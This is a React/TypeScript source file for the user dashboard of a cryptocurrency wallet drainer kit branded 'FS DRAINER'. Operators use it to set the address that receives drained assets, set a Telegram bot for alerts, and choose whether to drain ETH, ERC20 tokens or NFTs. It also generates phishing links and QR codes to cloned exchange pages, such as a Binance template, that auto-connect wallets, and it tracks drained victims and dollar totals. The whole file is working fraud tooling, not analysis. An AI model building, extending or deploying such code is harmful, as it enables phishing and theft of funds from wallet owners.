/**
 * UserDashboard - Personal dashboard for each logged-in user
 * Shows their stats, settings, drain links, and template management
 */
import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { getLoginUrl } from "@/const";
import { toast } from "sonner";
import { DRAINER_TEMPLATES } from "@/lib/templates";
import QRCode from "qrcode";
import { useEffect, useRef } from "react";

// ── Icons (inline SVG) ──────────────────────────────────────────────────────
const Icon = ({ d, size = 16 }: { d: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={d} />
  </svg>
);

export default function UserDashboard() {
  const { user, isAuthenticated, loading } = useAuth();
  const [activeTab, setActiveTab] = useState<"overview" | "settings" | "links" | "templates" | "connections" | "transactions">("overview");
  const [saving, setSaving] = useState<string | null>(null);
  const [editSettings, setEditSettings] = useState<Record<string, string>>({});
  const qrCanvasRef = useRef<HTMLCanvasElement>(null);
  const [qrGenerated, setQrGenerated] = useState(false);

  const { data: mySettings, refetch: refetchSettings } = trpc.user.getMySettings.useQuery(undefined, { enabled: isAuthenticated });
  const { data: myStats } = trpc.user.getMyStats.useQuery(undefined, { enabled: isAuthenticated });
  const { data: myConnections } = trpc.user.getMyConnections.useQuery({ limit: 20, offset: 0 }, { enabled: isAuthenticated && activeTab === "connections" });
  const { data: myTransactions } = trpc.user.getMyTransactions.useQuery({ limit: 20, offset: 0 }, { enabled: isAuthenticated && activeTab === "transactions" });
  const updateSetting = trpc.user.updateMySetting.useMutation({
    onSuccess: () => { refetchSettings(); toast.success("Setting saved!"); setSaving(null); },
    onError: () => { toast.error("Failed to save"); setSaving(null); },
  });

  useEffect(() => {
    if (mySettings) setEditSettings({ ...mySettings });
  }, [mySettings]);

  // Generate QR for the drain link
  const generateQR = async (url: string) => {
    if (!qrCanvasRef.current) return;
    await QRCode.toCanvas(qrCanvasRef.current, url, { width: 200, margin: 2, color: { dark: "#00FFFF", light: "#0A0A0A" } });
    setQrGenerated(true);
  };

  const saveSetting = (key: string, value: string) => {
    setSaving(key);
    updateSetting.mutate({ key, value });
  };

  const copyToClipboard = (text: string, label = "Copied!") => {
    navigator.clipboard.writeText(text).then(() => toast.success(label));
  };

  const downloadQR = () => {
    if (!qrCanvasRef.current) return;
    const link = document.createElement("a");
    link.download = "drain-qr.png";
    link.href = qrCanvasRef.current.toDataURL("image/png");
    link.click();
  };

  const getDrainLink = (templateId: string, ref = "link") => {
    return `${window.location.origin}/p/${templateId}?action=connect&ref=${ref}`;
  };

  const getDirectLink = () => `${window.location.origin}/?action=connect&ref=direct`;

  if (loading) return (
    <div className="min-h-screen bg-black flex items-center justify-center">
      <div className="text-cyan-400 text-lg font-mono animate-pulse">LOADING...</div>
    </div>
  );

  if (!isAuthenticated) return (
    <div className="min-h-screen bg-black flex items-center justify-center">
      <div className="text-center space-y-4">
        <div className="text-4xl font-black text-cyan-400 font-mono">ACCESS DENIED</div>
        <p className="text-gray-400">You must be logged in to access the dashboard</p>
        <a href={getLoginUrl()} className="inline-block px-6 py-3 bg-cyan-500 text-black font-bold rounded-lg hover:bg-cyan-400 transition-colors">
          LOGIN
        </a>
      </div>
    </div>
  );

  const activeTemplate = editSettings.active_template ?? "binance";
  const drainLink = getDrainLink(activeTemplate);

  const tabs = [
    { id: "overview", label: "📊 Overview" },
    { id: "settings", label: "⚙️ Settings" },
    { id: "links", label: "🔗 Links & QR" },
    { id: "templates", label: "🌐 Templates" },
    { id: "connections", label: "🔌 Connections" },
    { id: "transactions", label: "💰 Transactions" },
  ] as const;

  return (
    <div className="min-h-screen bg-black text-white" style={{ fontFamily: "'Rajdhani', sans-serif" }}>
      {/* Header */}
      <div className="border-b border-cyan-900/30 bg-black/80 backdrop-blur sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-cyan-400 font-black font-mono text-lg">⚡ FS DRAINER</span>
            <span className="text-gray-600 text-sm">|</span>
            <span className="text-gray-400 text-sm">{user?.name ?? user?.email ?? "User"}</span>
          </div>
          <div className="flex items-center gap-2">
            <a href="/" className="text-xs text-gray-500 hover:text-cyan-400 transition-colors px-3 py-1 border border-gray-800 rounded">
              ← Back to Site
            </a>
          </div>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 py-6">
        {/* Tabs */}
        <div className="flex gap-1 mb-6 overflow-x-auto pb-2">
          {tabs.map(tab => (
            <button key={tab.id} onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2 rounded-lg text-sm font-semibold whitespace-nowrap transition-all ${activeTab === tab.id
                ? "bg-cyan-500/20 text-cyan-400 border border-cyan-500/50"
                : "text-gray-500 hover:text-gray-300 border border-transparent"}`}>
              {tab.label}
            </button>
          ))}
        </div>

        {/* ── Overview ── */}
        {activeTab === "overview" && (
          <div className="space-y-6">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { label: "Total Connections", value: myStats?.connections.total ?? 0, color: "cyan" },
                { label: "Drained Wallets", value: myStats?.connections.drained ?? 0, color: "pink" },
                { label: "Transactions", value: myStats?.transactions.total ?? 0, color: "purple" },
                { label: "Total Drained", value: `$${myStats?.transactions.totalUsdValue ?? "0"}`, color: "green" },
              ].map(stat => (
                <div key={stat.label} className="p-4 rounded-xl border"
                  style={{ background: `rgba(0,0,0,0.8)`, borderColor: stat.color === "cyan" ? "#00FFFF30" : stat.color === "pink" ? "#FF006630" : stat.color === "purple" ? "#8B5CF630" : "#00FF8830" }}>
                  <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
                  <p className="text-2xl font-black mt-1"
                    style={{ color: stat.color === "cyan" ? "#00FFFF" : stat.color === "pink" ? "#FF0066" : stat.color === "purple" ? "#A78BFA" : "#00FF88" }}>
                    {String(stat.value)}
                  </p>
                </div>
              ))}
            </div>

            {/* Quick Actions */}
            <div className="p-5 rounded-xl border border-cyan-900/30 bg-black/60">
              <h3 className="text-cyan-400 font-bold mb-4">⚡ Quick Actions</h3>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                <button onClick={() => setActiveTab("links")}
                  className="p-3 rounded-lg border border-cyan-500/30 text-cyan-400 text-sm font-semibold hover:bg-cyan-500/10 transition-colors">
                  🔗 Get Drain Link
                </button>
                <button onClick={() => { setActiveTab("links"); setTimeout(() => generateQR(drainLink), 100); }}
                  className="p-3 rounded-lg border border-pink-500/30 text-pink-400 text-sm font-semibold hover:bg-pink-500/10 transition-colors">
                  📱 Generate QR
                </button>
                <button onClick={() => setActiveTab("templates")}
                  className="p-3 rounded-lg border border-purple-500/30 text-purple-400 text-sm font-semibold hover:bg-purple-500/10 transition-colors">
                  🌐 Change Template
                </button>
                <button onClick={() => setActiveTab("settings")}
                  className="p-3 rounded-lg border border-green-500/30 text-green-400 text-sm font-semibold hover:bg-green-500/10 transition-colors">
                  ⚙️ Settings
                </button>
              </div>
            </div>

            {/* Current Config */}
            <div className="p-5 rounded-xl border border-gray-800 bg-black/60">
              <h3 className="text-gray-300 font-bold mb-4">📋 Current Configuration</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between items-center py-2 border-b border-gray-800">
                  <span className="text-gray-500">Drain Address</span>
                  <span className="text-cyan-400 font-mono text-xs">{(editSettings.drain_address ?? "").slice(0, 12)}...{(editSettings.drain_address ?? "").slice(-6)}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-800">
                  <span className="text-gray-500">Active Template</span>
                  <span className="text-pink-400 font-semibold capitalize">{editSettings.active_template ?? "binance"}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-800">
                  <span className="text-gray-500">Min Drain USD</span>
                  <span className="text-green-400">${editSettings.min_drain_usd ?? "0"}</span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="text-gray-500">Drain Types</span>
                  <div className="flex gap-2">
                    {editSettings.drain_eth === "true" && <span className="text-xs px-2 py-0.5 bg-cyan-500/20 text-cyan-400 rounded">ETH</span>}
                    {editSettings.drain_tokens === "true" && <span className="text-xs px-2 py-0.5 bg-pink-500/20 text-pink-400 rounded">Tokens</span>}
                    {editSettings.drain_nfts === "true" && <span className="text-xs px-2 py-0.5 bg-purple-500/20 text-purple-400 rounded">NFTs</span>}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ── Settings ── */}
        {activeTab === "settings" && (
          <div className="space-y-4 max-w-2xl">
            <h2 className="text-xl font-black text-cyan-400">⚙️ Personal Settings</h2>

            {[
              { key: "drain_address", label: "Drain Address (Receiver)", placeholder: "0x...", type: "text", desc: "All drained assets will be sent here" },
              { key: "tg_bot_token", label: "Telegram Bot Token", placeholder: "1234567890:AAF...", type: "text", desc: "Your personal Telegram bot token" },
              { key: "tg_chat_id", label: "Telegram Chat ID", placeholder: "123456789", type: "text", desc: "Your Telegram user/group ID" },
              { key: "min_drain_usd", label: "Minimum Drain Amount (USD)", placeholder: "0", type: "number", desc: "Skip wallets below this value" },
              { key: "custom_domain", label: "Custom Domain", placeholder: "yourdomain.com", type: "text", desc: "Your custom domain for drain pages" },
            ].map(field => (
              <div key={field.key} className="p-4 rounded-xl border border-gray-800 bg-black/60">
                <label className="block text-sm font-semibold text-gray-300 mb-1">{field.label}</label>
                <p className="text-xs text-gray-600 mb-2">{field.desc}</p>
                <div className="flex gap-2">
                  <input
                    type={field.type}
                    value={editSettings[field.key] ?? ""}
                    onChange={e => setEditSettings(prev => ({ ...prev, [field.key]: e.target.value }))}
                    placeholder={field.placeholder}
                    className="flex-1 bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white font-mono focus:border-cyan-500 focus:outline-none"
                  />
                  <button
                    onClick={() => saveSetting(field.key, editSettings[field.key] ?? "")}
                    disabled={saving === field.key}
                    className="px-4 py-2 bg-cyan-500/20 text-cyan-400 border border-cyan-500/50 rounded-lg text-sm font-semibold hover:bg-cyan-500/30 transition-colors disabled:opacity-50">
                    {saving === field.key ? "..." : "Save"}
                  </button>
                </div>
              </div>
            ))}

            {/* Drain Types */}
            <div className="p-4 rounded-xl border border-gray-800 bg-black/60">
              <label className="block text-sm font-semibold text-gray-300 mb-3">Drain Types</label>
              <div className="flex gap-4">
                {[
                  { key: "drain_eth", label: "ETH/Native", color: "cyan" },
                  { key: "drain_tokens", label: "ERC20 Tokens", color: "pink" },
                  { key: "drain_nfts", label: "NFTs", color: "purple" },
                ].map(toggle => (
                  <button key={toggle.key}
                    onClick={() => {
                      const newVal = editSettings[toggle.key] === "true" ? "false" : "true";
                      setEditSettings(prev => ({ ...prev, [toggle.key]: newVal }));
                      saveSetting(toggle.key, newVal);
                    }}
                    className={`px-4 py-2 rounded-lg text-sm font-semibold border transition-all ${editSettings[toggle.key] === "true"
                      ? toggle.color === "cyan" ? "bg-cyan-500/20 text-cyan-400 border-cyan-500/50" : toggle.color === "pink" ? "bg-pink-500/20 text-pink-400 border-pink-500/50" : "bg-purple-500/20 text-purple-400 border-purple-500/50"
                      : "bg-gray-900 text-gray-600 border-gray-800"}`}>
                    {editSettings[toggle.key] === "true" ? "✓" : "✗"} {toggle.label}
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ── Links & QR ── */}
        {activeTab === "links" && (
          <div className="space-y-6 max-w-2xl">
            <h2 className="text-xl font-black text-cyan-400">🔗 Drain Links & QR Codes</h2>

            {/* Direct Link */}
            <div className="p-5 rounded-xl border border-cyan-900/30 bg-black/60">
              <h3 className="text-cyan-400 font-bold mb-3">⚡ Direct Connect Link</h3>
              <p className="text-xs text-gray-500 mb-3">Opens wallet connect immediately when clicked</p>
              <div className="flex gap-2">
                <input readOnly value={getDirectLink()} className="flex-1 bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 text-xs text-cyan-400 font-mono" />
                <button onClick={() => copyToClipboard(getDirectLink(), "Link copied!")}
                  className="px-4 py-2 bg-cyan-500/20 text-cyan-400 border border-cyan-500/50 rounded-lg text-sm font-semibold hover:bg-cyan-500/30 transition-colors">
                  Copy
                </button>
              </div>
            </div>

            {/* Template Link */}
            <div className="p-5 rounded-xl border border-pink-900/30 bg-black/60">
              <h3 className="text-pink-400 font-bold mb-3">🌐 Template Drain Link</h3>
              <p className="text-xs text-gray-500 mb-3">Opens a crypto platform clone page with auto-connect</p>
              <div className="mb-3">
                <select
                  value={activeTemplate}
                  onChange={e => { setEditSettings(prev => ({ ...prev, active_template: e.target.value })); saveSetting("active_template", e.target.value); }}
                  className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white">
                  {DRAINER_TEMPLATES.map(t => (
                    <option key={t.id} value={t.id}>{t.logo} {t.name}</option>
                  ))}
                </select>
              </div>
              <div className="flex gap-2">
                <input readOnly value={drainLink} className="flex-1 bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 text-xs text-pink-400 font-mono" />
                <button onClick={() => copyToClipboard(drainLink, "Link copied!")}
                  className="px-4 py-2 bg-pink-500/20 text-pink-400 border border-pink-500/50 rounded-lg text-sm font-semibold hover:bg-pink-500/30 transition-colors">
                  Copy
                </button>
              </div>
            </div>

            {/* QR Code */}
            <div className="p-5 rounded-xl border border-purple-900/30 bg-black/60">
              <h3 className="text-purple-400 font-bold mb-3">📱 QR Code Generator</h3>
              <p className="text-xs text-gray-500 mb-4">Scan to open wallet connect on mobile</p>
              <div className="flex gap-3 mb-4">
                <button onClick={() => generateQR(drainLink)}
                  className="px-4 py-2 bg-purple-500/20 text-purple-400 border border-purple-500/50 rounded-lg text-sm font-semibold hover:bg-purple-500/30 transition-colors">
                  🔄 Generate QR
                </button>
                {qrGenerated && (
                  <button onClick={downloadQR}
                    className="px-4 py-2 bg-green-500/20 text-green-400 border border-green-500/50 rounded-lg text-sm font-semibold hover:bg-green-500/30 transition-colors">
                    💾 Download PNG
                  </button>
                )}
              </div>
              <div className="flex justify-center">
                <div className="p-3 bg-black rounded-xl border border-purple-500/30">
                  <canvas ref={qrCanvasRef} className="rounded-lg" />
                  {!qrGenerated && (
                    <div className="w-48 h-48 flex items-center justify-center text-gray-600 text-sm">
                      Click Generate QR
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ── Templates ── */}
        {activeTab === "templates" && (
          <div className="space-y-4">
            <h2 className="text-xl font-black text-cyan-400">🌐 Available Templates</h2>
            <p className="text-sm text-gray-500">Click any template to set it as active and get its drain link</p>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              {DRAINER_TEMPLATES.map(template => (
                <div key={template.id}
                  className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${activeTemplate === template.id ? "border-cyan-500/70 bg-cyan-500/10" : "border-gray-800 bg-black/60 hover:border-gray-600"}`}
                  onClick={() => { setEditSettings(prev => ({ ...prev, active_template: template.id })); saveSetting("active_template", template.id); }}>
                  <div className="text-3xl mb-2">{template.logo}</div>
                  <p className="font-bold text-sm text-white">{template.name}</p>
                  <p className="text-xs text-gray-500 mt-1">{template.category}</p>
                  {activeTemplate === template.id && (
                    <span className="text-xs text-cyan-400 font-semibold mt-2 block">✓ ACTIVE</span>
                  )}
                  <div className="mt-3 flex gap-1">
                    <a href={`/p/${template.id}`} target="_blank" rel="noreferrer"
                      className="text-xs px-2 py-1 bg-gray-800 text-gray-400 rounded hover:bg-gray-700 transition-colors"
                      onClick={e => e.stopPropagation()}>
                      Preview
                    </a>
                    <button
                      onClick={e => { e.stopPropagation(); copyToClipboard(getDrainLink(template.id), "Link copied!"); }}
                      className="text-xs px-2 py-1 bg-cyan-500/20 text-cyan-400 rounded hover:bg-cyan-500/30 transition-colors">
                      Copy Link
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ── Connections ── */}
        {activeTab === "connections" && (
          <div className="space-y-4">
            <h2 className="text-xl font-black text-cyan-400">🔌 Wallet Connections</h2>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-800 text-gray-500 text-xs uppercase">
                    <th className="text-left py-3 px-2">Wallet</th>
                    <th className="text-left py-3 px-2">Type</th>
                    <th className="text-left py-3 px-2">Network</th>
                    <th className="text-left py-3 px-2">Balance</th>
                    <th className="text-left py-3 px-2">Status</th>
                    <th className="text-left py-3 px-2">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {(myConnections as Array<{id: number; walletAddress: string; walletType: string; network: string; usdValue: string; status: string; createdAt: Date}> | undefined)?.map(conn => (
                    <tr key={conn.id} className="border-b border-gray-900 hover:bg-gray-900/30">
                      <td className="py-3 px-2 font-mono text-xs text-cyan-400">{conn.walletAddress.slice(0, 8)}...{conn.walletAddress.slice(-6)}</td>
                      <td className="py-3 px-2 text-gray-300">{conn.walletType}</td>
                      <td className="py-3 px-2 text-gray-400">{conn.network}</td>
                      <td className="py-3 px-2 text-green-400">${conn.usdValue}</td>
                      <td className="py-3 px-2">
                        <span className={`text-xs px-2 py-0.5 rounded ${conn.status === "drained" ? "bg-pink-500/20 text-pink-400" : conn.status === "connected" ? "bg-cyan-500/20 text-cyan-400" : "bg-gray-800 text-gray-500"}`}>
                          {conn.status}
                        </span>
                      </td>
                      <td className="py-3 px-2 text-gray-600 text-xs">{new Date(conn.createdAt).toLocaleString()}</td>
                    </tr>
                  ))}
                  {!myConnections?.length && (
                    <tr><td colSpan={6} className="py-8 text-center text-gray-600">No connections yet</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ── Transactions ── */}
        {activeTab === "transactions" && (
          <div className="space-y-4">
            <h2 className="text-xl font-black text-cyan-400">💰 Drain Transactions</h2>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-800 text-gray-500 text-xs uppercase">
                    <th className="text-left py-3 px-2">Token</th>
                    <th className="text-left py-3 px-2">Amount</th>
                    <th className="text-left py-3 px-2">USD Value</th>
                    <th className="text-left py-3 px-2">Network</th>
                    <th className="text-left py-3 px-2">Status</th>
                    <th className="text-left py-3 px-2">TX Hash</th>
                    <th className="text-left py-3 px-2">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {(myTransactions as Array<{id: number; tokenSymbol: string | null; amount: string | null; usdValue: string | null; network: string; status: string; txHash: string | null; createdAt: Date}> | undefined)?.map(tx => (
                    <tr key={tx.id} className="border-b border-gray-900 hover:bg-gray-900/30">
                      <td className="py-3 px-2 font-semibold text-white">{tx.tokenSymbol ?? "ETH"}</td>
                      <td className="py-3 px-2 text-cyan-400">{tx.amount ?? "0"}</td>
                      <td className="py-3 px-2 text-green-400">${tx.usdValue ?? "0"}</td>
                      <td className="py-3 px-2 text-gray-400">{tx.network}</td>
                      <td className="py-3 px-2">
                        <span className={`text-xs px-2 py-0.5 rounded ${tx.status === "success" ? "bg-green-500/20 text-green-400" : tx.status === "failed" ? "bg-red-500/20 text-red-400" : "bg-yellow-500/20 text-yellow-400"}`}>
                          {tx.status}
                        </span>
                      </td>
                      <td className="py-3 px-2 font-mono text-xs text-gray-500">{tx.txHash ? `${tx.txHash.slice(0, 10)}...` : "-"}</td>
                      <td className="py-3 px-2 text-gray-600 text-xs">{new Date(tx.createdAt).toLocaleString()}</td>
                    </tr>
                  ))}
                  {!myTransactions?.length && (
                    <tr><td colSpan={7} className="py-8 text-center text-gray-600">No transactions yet</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
